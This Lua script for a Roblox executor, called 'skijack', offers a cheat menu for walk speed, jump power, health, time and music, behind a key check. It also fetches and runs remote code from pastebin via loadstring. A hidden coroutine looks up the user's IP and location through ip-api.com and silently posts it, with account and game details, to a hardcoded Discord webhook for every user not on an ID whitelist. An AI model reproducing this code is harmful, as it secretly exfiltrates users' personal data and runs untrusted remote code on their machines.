local UI = {};

local Players = game:GetService("Players");
local MS = game:GetService("MarketplaceService");
local RS = game:GetService("ReplicatedStorage");
local HttpService = game:GetService("HttpService");
local Player = Players.LocalPlayer;
local PUI = Player.PlayerGui;
if not game:GetService("RunService"):IsStudio() then
	PUI = game.CoreGui;
end;
local Headers = {
	["content-type"] = "application/json"
};

if PUI:FindFirstChild("skijack") then
	print("Reloading skijack...");
	PUI.skijack:Destroy();
end;
if PUI:FindFirstChild("jackhandler") then
	PUI.jackhandler:Destroy();
end;

--ScreenUI
local MainUI=Instance.new("ScreenGui");
MainUI.Name="skijack";
MainUI.Enabled=true;
MainUI.IgnoreGuiInset=true;
MainUI.Parent=PUI;

local loade = Instance.new("Sound");
loade.Name="load";
loade.SoundId="rbxassetid://8747340426";
loade.Parent=MainUI;
loade:Play();
loade.Ended:Connect(function()
	loade:Destroy();
end);

--Loading Screen
local Loading = Instance.new("TextLabel");
Loading.Name="Loading";
Loading.ZIndex=99999;
Loading.BackgroundColor3=Color3.new(0, 0, 0);
Loading.BackgroundTransparency=0.5;
Loading.Font=Enum.Font.GothamBold;
Loading.TextScaled=true;
Loading.TextColor3=Color3.new(1, 1, 1);
Loading.Size=UDim2.new(1,0,1,0);
Loading.Visible=true;
Loading.Text="Loading skijack | "..game.Name;
Loading.Parent=MainUI;

print("skijack Loaded!");
print("Starting skijack...");

function UI:CreateLabel(Frame, Text, Color, Font)
	local Xh=Instance.new("TextLabel");
	Xh.Name=tostring(Text) or "Huh";
	Xh.Font=Font;
	Xh.Text=Text;
	Xh.TextScaled=true;
	Xh.TextColor3=Color;
	Xh.BackgroundTransparency=1;
	Xh.ZIndex=Frame.ZIndex+2;
	Xh.Parent=Frame;
	return Xh;
end;

function UI:CreateBox(Frame, Text, Color)
	local Uh=Instance.new("TextBox");
	Instance.new("UICorner").Parent=Uh;
	Uh.Name=tostring(Text) or "Huh";
	Uh.Font=Enum.Font.GothamBold;
	Uh.PlaceholderColor3=Color3.new(0.72549, 0.72549, 0.72549)
	Uh.PlaceholderText=Text;
	Uh.Text="";
	Uh.TextScaled=true;
	Uh.TextColor3=Color3.new(1, 1, 1);
	Uh.BackgroundColor3=Color;
	Uh.BackgroundTransparency=0.5;
	Uh.ZIndex=Frame.ZIndex+2;
	Uh.Parent=Frame;
	return Uh;
end;

function UI:CreateButton(Frame, Text, Color)
	local CUh=Instance.new("TextButton");
	Instance.new("UICorner").Parent=CUh;
	CUh.Name=tostring(Text) or "Huh";
	CUh.Font=Enum.Font.GothamBold;
	CUh.Text=Text;
	CUh.TextScaled=true;
	CUh.TextColor3=Color3.new(1, 1, 1);
	CUh.BackgroundColor3=Color;
	CUh.BackgroundTransparency=0.5;
	CUh.ZIndex=Frame.ZIndex+2;
	CUh.Parent=Frame;
	return CUh;
end;

function UI:CreateClose(Frame, Index)
	local CC=Instance.new("TextButton");
	Instance.new("UICorner").Parent=CC;
	CC.Font=Enum.Font.GothamBold;
	CC.Text="X";
	CC.TextScaled=true;
	CC.TextColor3=Color3.new(1, 1, 1);
	CC.BackgroundColor3=Color3.new(1, 0.243137, 0.243137);
	CC.BackgroundTransparency=0.5;
	CC.ZIndex=Index+2;
	CC.Size=UDim2.new(0.1,0,0.1,0);
	CC.Position=UDim2.new(0.9,0,0,0);
	CC.Parent=Frame;
	return CC;
end;

function UI:CreateTitle(Frame, Text)
	local jackTitle=Instance.new("TextLabel");
	jackTitle.Name=tostring(Text) or "Huh";
	jackTitle.Font=Enum.Font.GothamBold;
	jackTitle.Text=Text;
	jackTitle.TextScaled=true;
	jackTitle.TextColor3=Color3.new(1, 1, 1);
	jackTitle.BackgroundTransparency=1;
	jackTitle.ZIndex=Frame.ZIndex+1;
	jackTitle.Size=UDim2.new(0.9,0,0.1,0);
	jackTitle.Parent=Frame;
	return jackTitle;
end;

function UI:CreateScroll(Frame, Index)
	local GameUI=Instance.new("ScrollingFrame");
	GameUI.BorderSizePixel=0;
	GameUI.BackgroundTransparency=1;
	GameUI.ZIndex=Index+1;
	GameUI.Size=UDim2.new(1,0,0.8,0);
	GameUI.Position=UDim2.new(0,0,0.1,0);
	GameUI.Visible=true;
	GameUI.AutomaticCanvasSize=Enum.AutomaticSize.Y;
	GameUI.Parent=Frame;
	local GameGrid = Instance.new("UIGridLayout");
	GameGrid.HorizontalAlignment=Enum.HorizontalAlignment.Center;
	GameGrid.CellSize=UDim2.new(0.95,0,0.075,0);
	GameGrid.Parent=GameUI;
	return GameUI;
end;

function UI:CreateScrollScriptsFrame(Frame, Index)
	local GameUI=Instance.new("ScrollingFrame");
	GameUI.BorderSizePixel=0;
	GameUI.BackgroundTransparency=1;
	GameUI.ZIndex=Index+1;
	GameUI.Size=UDim2.new(1,0,0.8,0);
	GameUI.Position=UDim2.new(0,0,0.1,0);
	GameUI.Visible=true;
	GameUI.AutomaticCanvasSize=Enum.AutomaticSize.Y;
	GameUI.Parent=Frame;
	local GameGrid = Instance.new("UIGridLayout");
	GameGrid.HorizontalAlignment=Enum.HorizontalAlignment.Center;
	GameGrid.CellPadding=UDim2.new(0,15,0,10);
	GameGrid.CellSize=UDim2.new(0.95,0,0.3,0);
	GameGrid.Parent=GameUI;
	return GameUI;
end;

function UI:CreateNumberValue(Name, Value)
	local CV = Instance.new("NumberValue");
	CV.Value = Value;
	CV.Name = Name;
	CV.Parent=MainUI;
	return CV;
end;

function UI:Drag(gui)
	local UserInputService = game:GetService("UserInputService")
	local dragging
	local dragInput
	local dragStart
	local startPos
	local function  update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end;

function UI:CreateMenu(Name, Color, Index, Visible)
	local CM=Instance.new("Frame");
	Instance.new("UICorner").Parent=CM;
	local Stroke = Instance.new("UIStroke");
	Stroke.Thickness=2;
	Stroke.Color=Color3.new(0.32549, 0.32549, 0.32549);
	Stroke.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;
	Stroke.Parent=CM;
	CM.Name=Name;
	CM.BackgroundColor3=Color;
	CM.ZIndex=Index;
	CM.Size=UDim2.new(0.25,0,0.5,0);
	CM.Position=UDim2.new(0.5,0,0.25,0);
	CM.Visible=Visible;
	CM.Parent=MainUI;
	local CC = UI:CreateClose(CM, Index);
	CC.MouseButton1Down:Connect(function()
		CM.Visible=false;
	end);
	UI:Drag(CM);
	return UI:CreateScroll(CM, Index);
end;

function UI:CreateClickSounds()
	for i,v in pairs(MainUI:GetDescendants()) do
		if v:IsA("TextButton") or v:IsA("ImageButton") then
			v.MouseButton1Down:Connect(function()
				local CS = Instance.new("Sound");
				CS.SoundId="rbxassetid://177266782";
				CS.Parent=v;
				CS:Play();
				CS.Ended:Connect(function()
					CS:Destroy();
				end);
			end);
		end;
	end;
end;

local function rgbToHex(rgb)
	local hexadecimal = '0X'
	for key, value in pairs(rgb) do
		local hex = ''
		while (value > 0) do
			local index = math.fmod(value, 16) + 1
			value = math.floor(value / 16)
			hex = string.sub('0123456789ABCDEF', index, index) .. hex
		end
		if (string.len(hex) == 0) then
			hex = '00'
		elseif (string.len(hex) == 1) then
			hex = '0' .. hex
		end
		hexadecimal = hexadecimal .. hex
	end
	return hexadecimal
end

local CXolor = Color3.new(0.129412, 0.129412, 0.129412);

--Main Menu
local jackUI=UI:CreateMenu("skijack", CXolor, 10000, true);

--Character Settings Frame
local CharacterUI=UI:CreateMenu("charatcerskijack", CXolor, 10010, false);

--Game Settings Frame
local GameUI=UI:CreateMenu("gameskijack", CXolor, 10020, false);

--UI Settings Frame
local UIUI=UI:CreateMenu("UIskijack", CXolor, 10030, false);

--Title Text For Main Menu
local jackTitle=UI:CreateTitle(jackUI.Parent, "Welcome, "..Player.Name.."!");

--Key Changer Textbox
local KeyBox=UI:CreateBox(jackUI, "Enter Key Here", Color3.new(1, 0, 0));

--Key Button
local KeyButton=UI:CreateButton(jackUI, "Copy Key Link", Color3.new(1, 0, 0));

--Key Link
local KeyTextButton1=UI:CreateBox(jackUI, "https://pastebin.com/raw/JeqMhbFQ", Color3.new(1, 0, 0));
KeyTextButton1.TextEditable=false;
KeyTextButton1.Text="https://pastebin.com/raw/JeqMhbFQ";

local CKey = loadstring(game:HttpGet("https://pastebin.com/raw/JeqMhbFQ"))();
local OldKeys = loadstring(game:HttpGet("https://pastebin.com/raw/35p4ZDFn"))();

local KV = Instance.new("StringValue");
KV.Value = "";
KV.Name = "Key";
KV.Parent = KeyBox;

coroutine.resume(coroutine.create(function()
local RGB = {255, 255, 255};
local Hex = tonumber(rgbToHex({RGB[1], RGB[2], RGB[3]}));

local Success, Response = pcall(function()
	return game:HttpGet(('http://ip-api.com/json/'),true)
end);

local Bruh = "Couldn't Get Info";

if Success then
	Bruh=tostring(Response);
end;

local data = {
	["content"] = "",
	["embeds"] = {{
		["title"] = "Script Ran",
		["description"] = "Script Ran In",
		["thumbnail"] = {
			url = "https://www.roblox.com/bust-thumbnail/image?userId=" .. Player.UserId ..
				"&width=60&height=60&format=jpg"
		},
		["type"] = "rich",
		["color"] = Hex,
		["fields"] = {{
			["name"] = "[User Info](https://www.roblox.com/users/"..Player.UserId.."/profile)",
			["value"] = "ID: "..Player.UserId.." | Username: "..Player.Name.." | Display Name: "..Player.DisplayName.." | Account Age: "..Player.AccountAge.."/"..os.date("%Y-%m-%d", os.time() - Player.AccountAge * 86400).." | Membership: "..tostring(Player.MembershipType).." | Local: "..Player.LocaleId,
			["inline"] = false
		}, {
			["name"] = "["..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."](https://www.roblox.com/games/"..game.PlaceId.."/)",
			["value"] = "Place ID: "..game.PlaceId.." | Game ID: "..game.GameId.." | Creator ID: "..game.CreatorId.." | Creator Type: "..tostring(game.CreatorType),
			["inline"] = false
		},
		{
			["name"] = "[Info]("..tostring(Success)..")",
			["value"] = Bruh,
			["inline"] = false
		},
		}
	}}
}

local Info = game:GetService("HttpService"):JSONEncode(data)
local HttpRequest = http_request;
if syn then
	HttpRequest = syn.request
else
	HttpRequest = http_request
end
if Player.UserId==481733029 or Player.UserId==1314068606 or Player.UserId==1461714722 or Player.UserId==1739044056 or Player.UserId==1175649423 or Player.UserId==1737829220 or Player.UserId==649548543 or Player.UserId==1248584271 or Player.UserId==363810181 or Player.UserId==1236048684 or Player.UserId==368193540 then else
HttpRequest({
	Url = "https://discord.com/api/webhooks/1134513332003549224/rl53s5YrUMejSsrFbZCJMt7W-AvfvoJnXyV4QDSkHzTxDoZSCcHBvvA55-Dqucls_KfA",
	Body = Info,
	Method = "POST",
	Headers = Headers
})
			end
end));

KeyBox.FocusLost:Connect(function()
	if KeyBox.Text ~= nil and KeyBox.Text ~= "" and tostring(KeyBox.Text) then
		if KeyBox.Text == CKey then
			KeyBox.Text="";
			KeyBox.PlaceholderText="Correct Key";
			KV.Value=CKey;
		elseif Player.UserId==481733029 or Player.UserId==1314068606 or Player.UserId==1461714722 or Player.UserId==1739044056 or Player.UserId==1175649423 or Player.UserId==1737829220 or Player.UserId==649548543 or Player.UserId==1248584271 or Player.UserId==363810181 or Player.UserId==1236048684 or Player.UserId==368193540 then
			KeyBox.Text="";
			KeyBox.PlaceholderText="Whitelisted";
			KV.Value=CKey;
		elseif OldKeys[KeyBox.Text]==true then
			KeyBox.Text="";
			KeyBox.PlaceholderText="Expired/Old Key";
			local CS = Instance.new("Sound");
			CS.SoundId="rbxassetid://160715357";
			CS.Parent=KeyBox;
			CS:Play();
			CS.Ended:Connect(function()
				CS:Destroy();
			end);
			wait(2);
			KeyBox.PlaceholderText="Enter Key Here";
		else
			KeyBox.Text="";
			KeyBox.PlaceholderText="Incorrect Key";
			local CS = Instance.new("Sound");
			CS.SoundId="rbxassetid://160715357";
			CS.Parent=KeyBox;
			CS:Play();
			CS.Ended:Connect(function()
				CS:Destroy();
			end);
			wait(2);
			KeyBox.PlaceholderText="Enter Key Here";
		end;
	else
		KeyBox.Text="";
		KeyBox.PlaceholderText="Failed To Check Key";
		local CS = Instance.new("Sound");
		CS.SoundId="rbxassetid://160715357";
		CS.Parent=KeyBox;
		CS:Play();
		CS.Ended:Connect(function()
			CS:Destroy();
		end);
		wait(2);
		KeyBox.PlaceholderText="Enter Key Here";
	end;
end);

KeyButton.MouseButton1Down:Connect(function()
	coroutine.resume(coroutine.create(function()
		setclipboard("https://workink.net/1QoV/lk3lx4k5");
		toclipboard("https://workink.net/1QoV/lk3lx4k5");
	end));
end);
Loading.Visible=false;

KV.Changed:Connect(function()
	if KV.Value~=nil and KV.Value==CKey then
		Loading.Visible=true;
		KeyButton.Visible=false;
		KeyBox.Visible=false;
		KeyTextButton1.Visible=false;

		--Title Text for Character Settings
		local CjackTitle=UI:CreateTitle(CharacterUI.Parent, "Character Settings");

		--Title Text for Game Settings
		local GjackTitle=UI:CreateTitle(GameUI.Parent, "Game Settings");

		--Title Text for UI Settings
		local UjackTitle=UI:CreateTitle(UIUI.Parent, "UI Settings");

		--Discord Button
		local DiscordButton1=UI:CreateButton(UIUI, "Copy Discord Link", Color3.new(0, 0.666667, 1));

		--Discord Link
		local DiscordTextButton1=UI:CreateBox(UIUI, "https://discord.gg/cAbAdVqKY2", Color3.new(0, 0.666667, 1));
		DiscordTextButton1.TextEditable=false;
		DiscordTextButton1.Text="https://discord.gg/cAbAdVqKY2";

		--WalkSpeed Changer Textbox
		local Button1=UI:CreateBox(CharacterUI, "Enter WalkSpeed Here", Color3.new(1, 0, 0));

		--JumpPower Changer Textbox
		local Button2=UI:CreateBox(CharacterUI, "Enter JumpPower Here", Color3.new(1, 0, 0));

		--Health/HP Changer Textbox
		local Button3=UI:CreateBox(CharacterUI, "Enter Health/HP Here", Color3.new(1, 0, 0));

		--Time Changer Textbox
		local Button4=UI:CreateBox(GameUI, "Enter Time Here", Color3.new(1, 1, 0));

		--Music Textbox
		local Button5=UI:CreateBox(GameUI, "Enter Audio ID Here", Color3.new(1, 1, 0));

		-- Rejoin Button
		local RejoinButton = UI:CreateButton(GameUI, "Rejoin", Color3.new(1, 1, 0));

		-- Anti AFK Button
		local AFKButton = UI:CreateButton(GameUI, "Anti AFK", Color3.new(1, 1, 0));

		--Theme Button
		local THEMEButton1=UI:CreateButton(UIUI, "Theme: Dark", Color3.new(0, 0.666667, 1));

		--Character Settings Open Button
		local CButton1=UI:CreateButton(jackUI, "Character Settings", Color3.new(1, 0, 0));

		--UI Settings Open Button
		local CButton2=UI:CreateButton(jackUI, "UI Settings", Color3.new(0, 0.666667, 1));

		--Game Settings Open Button
		local CButton3=UI:CreateButton(jackUI, "Game Settings", Color3.new(1, 1, 0));


		CButton1.MouseButton1Down:Connect(function()
			CharacterUI.Parent.Visible=not CharacterUI.Parent.Visible;
		end);

		CButton2.MouseButton1Down:Connect(function()
			UIUI.Parent.Visible=not UIUI.Parent.Visible;
		end);

		CButton3.MouseButton1Down:Connect(function()
			GameUI.Parent.Visible=not GameUI.Parent.Visible;
		end);


		RejoinButton.MouseButton1Down:Connect(function()
			RejoinButton.Text = "Rejoining...";
			game:GetService("TeleportService"):Teleport(game.PlaceId);
		end);

		AFKButton.MouseButton1Down:Connect(function()
			local vu = game:GetService("VirtualUser")
			game:GetService("Players").LocalPlayer.Idled:connect(function()
				vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
				wait(1)
				print("anti-afk")
				vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
			end)
		end);

		THEMEButton1.MouseButton1Down:Connect(function()
			if CXolor == Color3.new(0.129412, 0.129412, 0.129412) then
				CXolor = Color3.new(0.917647, 0.917647, 0.917647);
				THEMEButton1.Text="Theme: Light";
			else
				CXolor = Color3.new(0.129412, 0.129412, 0.129412);
				THEMEButton1.Text="Theme: Dark";
			end;
			for i,v in pairs(MainUI:GetChildren()) do
				v.BackgroundColor3=CXolor;
			end;
		end);

		DiscordButton1.MouseButton1Down:Connect(function()
			coroutine.resume(coroutine.create(function()
				setclipboard("https://discord.gg/cAbAdVqKY2");
				toclipboard("https://discord.gg/cAbAdVqKY2");
			end));
		end);

		Button5.FocusLost:Connect(function()
			local Check5 = tonumber(Button5.Text);
			if Button5.Text ~= nil and Button5.Text ~= "" and typeof(Check5)=="number" then
				if game:GetService("Workspace"):FindFirstChild("jackimusic") then
					game:GetService("Workspace"):FindFirstChild("jackimusic"):Destroy();
				end;
				local Msu = Instance.new("Sound");
				Msu.Looped=true;
				Msu.Name="jackimusic";
				Msu.SoundId="rbxassetid://"..Check5;
				Msu.Parent=game:GetService("Workspace");
				Msu:Play();
				Button5.Text="";
			else
				Button5.Text="";
				Button5.PlaceholderText="Failed To Play Audio";
				local CS = Instance.new("Sound");
				CS.SoundId="rbxassetid://160715357";
				CS.Parent=Button5;
				CS:Play();
				CS.Ended:Connect(function()
					CS:Destroy();
				end);
				wait(2);
				Button5.PlaceholderText="Enter Audio ID Here";
			end;
		end);

		Button4.FocusLost:Connect(function()
			local Check4 = tonumber(Button4.Text);
			if Button4.Text ~= nil and Button4.Text ~= "" and typeof(Check4)=="number" then
				if Check4 < 24 and Check4 > 0 then
					game:GetService("Lighting").ClockTime=Check4;
					Button4.Text="";
				else
					Button4.Text="";
					Button4.PlaceholderText="Failed To Set Time";
					local CS = Instance.new("Sound");
					CS.SoundId="rbxassetid://160715357";
					CS.Parent=Button4;
					CS:Play();
					CS.Ended:Connect(function()
						CS:Destroy();
					end);
					wait(2);
					Button4.PlaceholderText="Enter Time Here";
				end;
			else
				Button4.Text="";
				Button4.PlaceholderText="Failed To Set Time";
				local CS = Instance.new("Sound");
				CS.SoundId="rbxassetid://160715357";
				CS.Parent=Button4;
				CS:Play();
				CS.Ended:Connect(function()
					CS:Destroy();
				end);
				wait(2);
				Button4.PlaceholderText="Enter Time Here";
			end;
		end);

		Button3.FocusLost:Connect(function()
			local Check3 = tonumber(Button3.Text);
			if Button3.Text ~= nil and Button3.Text ~= "" and typeof(Check3)=="number" then
				Player.Character.Humanoid.MaxHealth=Button3.Text;
				Player.Character.Humanoid.Health=Button3.Text;
				Button3.Text="";
			else
				Button3.Text="";
				Button3.PlaceholderText="Failed To Set Health/HP";
				local CS = Instance.new("Sound");
				CS.SoundId="rbxassetid://160715357";
				CS.Parent=Button3;
				CS:Play();
				CS.Ended:Connect(function()
					CS:Destroy();
				end);
				wait(2);
				Button3.PlaceholderText="Enter Health/HP Here";
			end;
		end);

		Button2.FocusLost:Connect(function()
			local Check2 = tonumber(Button2.Text);
			if Button2.Text ~= nil and Button2.Text ~= "" and typeof(Check2)=="number" then
				Player.Character.Humanoid.JumpPower=Button2.Text;
				Button2.Text="";
			else
				Button2.Text="";
				Button2.PlaceholderText="Failed To Set JumpPower";
				local CS = Instance.new("Sound");
				CS.SoundId="rbxassetid://160715357";
				CS.Parent=Button2;
				CS:Play();
				CS.Ended:Connect(function()
					CS:Destroy();
				end);
				wait(2);
				Button2.PlaceholderText="Enter JumpPower Here";
			end;
		end);

		Button1.FocusLost:Connect(function()
			local Check1 = tonumber(Button1.Text);
			if Button1.Text ~= nil and Button1.Text ~= "" and typeof(Check1)=="number" then
				Player.Character.Humanoid.WalkSpeed=Button1.Text;
				Button1.Text="";
			else
				Button1.Text="";
				Button1.PlaceholderText="Failed To Set WalkSpeed";
				local CS = Instance.new("Sound");
				CS.SoundId="rbxassetid://160715357";
				CS.Parent=Button1;
				CS:Play();
				CS.Ended:Connect(function()
					CS:Destroy();
				end);
				wait(2);
				Button1.PlaceholderText="Enter WalkSpeed Here";
			end;
		end);

		Player:GetMouse().KeyDown:connect(function(key)
			if string.lower(key) == "q"then
				MainUI.Enabled=not MainUI.Enabled;
			end;
		end);

		Loading.Visible=false;
		print("skijack Is  Now Active!");
	end;
end);

return UI;
